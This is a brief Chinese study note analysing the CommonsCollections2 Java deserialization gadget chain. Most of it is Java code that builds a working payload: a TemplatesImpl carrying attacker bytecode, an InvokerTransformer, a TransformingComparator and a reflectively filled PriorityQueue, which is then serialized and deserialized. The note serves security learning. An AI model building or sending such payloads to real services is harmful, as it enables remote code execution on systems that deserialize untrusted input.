# CommonsCollections2分析

## 1.环境搭建

```xml
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-collections4</artifactId>
    <version>4.1</version>
</dependency>
```

## 2.调试分析

```java
  TemplatesImpl templates = new TemplatesImpl();
  Class templatesImplClass = templates.getClass();

  Field name = templatesImplClass.getDeclaredField("_name");
  name.setAccessible(true);
  name.set(templates,"aaaa");

  Field byteCodes = templatesImplClass.getDeclaredField("_bytecodes");
  byteCodes.setAccessible(true);
  byteCodes.set(templates,new byte[][]{Files.readAllBytes(Paths.get("/Users/me7eorite/Documents/GitHub/Learning-Demo/JavaStudy/target/classes/com/learning/security/serialization/commons/Exp.class"))});

  Field tfactory = templatesImplClass.getDeclaredField("_tfactory");
  tfactory.setAccessible(true);
  tfactory.set(templates,new TransformerFactoryImpl());

  InvokerTransformer newTransformer = new InvokerTransformer<>("newTransformer", new Class[]{}, new Object[]{});

  TransformingComparator transformingComparator = new TransformingComparator(newTransformer);

  PriorityQueue priorityQueue = new PriorityQueue(transformingComparator);
  Class priorityClass = priorityQueue.getClass();
  Field size = priorityClass.getDeclaredField("size");
  size.setAccessible(true);
  size.set(priorityQueue,2);

  Field queue = priorityClass.getDeclaredField("queue");
  queue.setAccessible(true);
  queue.set(priorityQueue,new Object[]{templates,templates});

//        priorityQueue.add("2");
  byte[] serialize = serialize(priorityQueue);
  unSerialize(serialize);
```





